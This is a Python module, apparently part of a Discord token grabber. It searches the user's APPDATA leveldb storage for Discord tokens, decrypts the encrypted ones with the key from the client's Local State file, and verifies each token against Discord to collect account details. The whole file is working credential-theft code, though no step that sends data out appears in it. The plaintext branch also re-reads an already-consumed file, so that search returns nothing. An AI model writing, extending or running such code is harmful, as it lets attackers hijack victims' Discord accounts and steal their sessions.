import base64
import os
import pathlib
import re

from ..utils import buffer_decrypt, fetch_decryption_key
from .verifier import get_discord

official_discord_clients = {
    "discordptb",
    "discordcanary",
    "discord",
}

RICKROLL_ENCRYPTION_BARRIER_REGEX = re.compile(rb'"dQw4w9WgXcQ:(.+?)"')
DISCORD_CLIENT_TOKEN_REGEX = re.compile(rb"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}")


def iter_raw_tokens(*, strict_searching=False):
    base_path = pathlib.Path(os.getenv("APPDATA"))

    for path in base_path.glob("*/Local Storage/leveldb/*.ldb"):

        storage_owner = path.parent.parent.parent

        with open(path, "rb") as storage_file:
            encrypted_match = RICKROLL_ENCRYPTION_BARRIER_REGEX.search(
                storage_file.read()
            )

            if encrypted_match is not None:
                localstate = storage_owner / "Local State"
                if not localstate.exists():
                    if strict_searching:
                        raise RuntimeError(
                            f"Found an encrypted storage file at {path.as_posix()!r} but no localstate file at {localstate.as_posix()!r}"
                        )
                    continue

                payload = base64.b64decode(encrypted_match.group(1))
                decryption_key = fetch_decryption_key(localstate)

                yield buffer_decrypt(payload, decryption_key)

            else:
                match = DISCORD_CLIENT_TOKEN_REGEX.search(storage_file.read())

                if match is None:
                    continue

                yield match.group(0).decode("utf-8")


def iter_verified_tokens(session, *, strict_searching=False):
    for raw_token in iter_raw_tokens(strict_searching=strict_searching):
        discord_user = get_discord(session, raw_token)
        if discord_user:
            discord_user.update(token=raw_token)
            yield discord_user
